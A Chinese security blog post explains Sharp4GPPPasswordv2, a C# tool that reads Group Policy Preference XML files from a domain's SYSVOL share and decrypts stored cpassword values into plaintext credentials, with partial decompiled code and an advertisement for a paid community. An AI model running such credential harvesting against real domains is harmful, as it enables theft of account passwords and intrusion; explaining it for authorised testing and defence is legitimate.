---
title: .NET 一款获取域环境GPP存储密钥的工具
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493717&idx=1&sn=44687f69987aa2c10de35f2e9a6aee8c&chksm=fa5946b8cd2ecfaed3599335b481776855887d35f87c89655a03347b5cefd7ae1c3540c7b89d&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-07-31
fetch_date: 2025-10-06T17:44:04.185796
---

# .NET 一款获取域环境GPP存储密钥的工具

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8iaNmMVic159MtIElmtpOwfJcetRNmw1lCIicd0QibMtuym4B2WWTFDCu0sASfVNLyp2JgxwqA7HHuyQ/0?wx_fmt=jpeg)

# .NET 一款获取域环境GPP存储密钥的工具

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他方面

02

基本介绍

Sharp4GPPPasswordv2是一款专门用于在域环境中提取和解密存储在组策略首选项（Group Policy Preferences, GPP）中的明文密码的工具。GPP允许管理员在Active Directory环境中配置和管理用户和计算机的设置。然而，GPP中存储的密码采用了弱加密，这使得攻击者可以轻松地解密这些密码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8iaNmMVic159MtIElmtpOwfJOfDjH2yVq9AR6PSjg8v9erZMGJFmsWd6UXoZoYlcROc76Zp9r2nccA/640?wx_fmt=jpeg&from=appmsg)

03

编码实现

Sharp4GPPPasswordv2工具的主函数Main，首先检查命令行参数是否为空，如果不为空，否则，尝试从环境变量USERDNSDOMAIN获取域的名称，并且构建路径\\\\<domain>\\sysvol\\<domain>\\policies\\，该路径存储了组策略文件。

```
private static void Main(string[] args)
{
    string text;
    if (args.Length != 0)
    {
        text = args[0];
    }
    else
    {
        text = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
    }
    if (string.IsNullOrEmpty(text))
    {
        Console.WriteLine("Machine is not part of domain - exit.");
        return;
    }
    string text2 = string.Concat(new string[]
    {
        "\\\\",
        text,
        "\\sysvol\\",
        text,
        "\\policies\\"
    });
    Console.WriteLine("Processing files in {0}", text2);
    Program.ProcessAllFiles(text2, new Action<string>(Program.ProcessFile));
    Console.WriteLine("Finished processing!");
}
```

随后，ProcessFile函数首先接受一个文件路径作为参数。并创建一个XmlDocument对象，并尝试加载指定路径的XML文件。如果加载失败，输出错误信息并返回。

```
private static void ProcessFile(string path)
{
    Console.WriteLine("Parsing file: {0}", path);
    XmlDocument xmlDocument = new XmlDocument();
    try
    {
        xmlDocument.Load(path);
    }
    catch
    {
        Console.WriteLine("Error parsing {0}", path);
        return;
    }
```

根据文件名确定文件类型。程序分别处理以下几种文件：groups.xml、services.xml、scheduledtasks.xml、datasources.xml、printers.xml和drives.xml。

```
    string arg = "[RESULT] ";
    string a = Path.GetFileName(path).ToLower();
    if (!(a == "groups.xml"))
    {
        if (!(a == "services.xml"))
        {
            if (a == "scheduledtasks.xml")
            {
                goto IL_207;
            }
            if (a == "datasources.xml")
            {
                goto IL_2BD;
            }
            if (a == "printers.xml")
            {
                goto IL_373;
            }
            if (!(a == "drives.xml"))
            {
                return;
            }
            goto IL_429;
        }
    }
```

以处理groups.xml文件为例，使用XPath选择/Groups/User/Properties节点。遍历每个节点，提取并输出用户名、修改时间和解密后的密码，调用DecryptCPassword函数解密cpassword属性。

```
    else
    {
        using (IEnumerator enumerator = xmlDocument.SelectNodes("/Groups/User/Properties").GetEnumerator())
        {
            while (enumerator.MoveNext())
            {
                object obj = enumerator.Current;
                XmlNode xmlNode = (XmlNode)obj;
                try
                {
                    Console.WriteLine("{0} Username: {1}", arg, xmlNode.Attributes["userName"].Value);
                    Console.WriteLine("{0} Changed:  {1}", arg, xmlNode.ParentNode.Attributes["changed"].Value);
                    Console.WriteLine("{0} Password: {1}", arg, Program.DecryptCPassword(xmlNode.Attributes["cpassword"].Value));
                }
                catch
                {
                }
            }
            return;
        }
    }
```

通过分段解读，可以更清晰地了解ProcessFile函数的逻辑和实现。该函数根据文件名的不同，选择适当的XPath查询节点，提取相关信息并解密密码，最终输出结果。工具已经打包在星球，感兴趣的朋友可以加入自取。

04

推荐阅读

从漏洞分析到安全攻防，我们涵盖了.NET安全各个关键方面，为您呈现最新、最全面的.NET安全知识，下面是公众号发布的精华文章集合，推荐大家阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibBCrauQbUXaYlRQQKuy6ZRWYfI5fGSNRzQCia4EzreWe3efR7HIE3CLqP7eIJAUwdDDoqs7yfHhQw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493629&idx=1&sn=83235ca782ed28b7faaa18e2fe1919bb&chksm=fa594910cd2ec00688c18a740d98a9c7d75cca2190fb168285bc95facdfd0a20a854ef4d6bc1&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOE2ogFoYIdqnYynqF6XyicI7XfRsWsn36wsCpKpAJcIQOicZUhbDJOe0w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488762&idx=1&sn=a5710927a6ba09b5c83adf616e2b12ae&chksm=fa5aba17cd2d330119d1ab2ce4b3a434274f0adf96729dbf8f04bef16c389565fc144f84d341&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

06

欢迎加入.NET安全星球

为了更好地应对基于.NET技术栈的风险识别和未知威胁，dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。

 目前星球门票¥199，后期价格随着内容和质量的不断沉淀会适当提高，星球计划于07.30日涨价 至 ¥239，因此越早加入越好！

    目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最活跃的技术知识库之一，从.NET Framework到.NET Core，从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的安全指南和最佳实践。

星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多高质量的.NET安全资源，可以说市面上很少见，都是干货。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibzerwUbGOupPoJgYlZNMo1gg58eGoicPibjMBKkEo1zOia6zOyeupYasZZ9DTFvJVvzJQTEuhKrvTsA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOc2SogKzZ16SD7dpzF3v81kia4ZAx5QU5ibnNibEo8kZZSJgrficz4Ckxwg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

星球文化始终认为授人以鱼不如授人以渔！加入星球后可以跟星主和嘉宾们一对一提问交流，20+个专题栏目涵盖了点、线、面、体等知识面，助力师傅们快速成长！其中主题包括.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell免杀、命令执行、C#工具库等等。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz01qCxrYGBR94wibZ7sk1zIO9DzCgviab9vmUic8qmvynXhSM8LxFhGG97w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

    我们倾力打造专刊、视频等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9XgicSeCfnDO0KyvDNdCZhG3pTSWHRekG0Wrp0FXyHO1mz9ia5uiaICjCmg5jIzx4ERLU8MjXWVSkCw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

我们还有一个会员专属的内部星球陪伴群，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YiccvW0LwqSx3grm4bgM0fz07qexJ82p5wxfXsVyzE3cc1WOVswovGicr35RthtQKpibYwibbSvicTRnjA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

为了助力大家在2024国家级hvv演练中脱颖而出，我们特别整理出...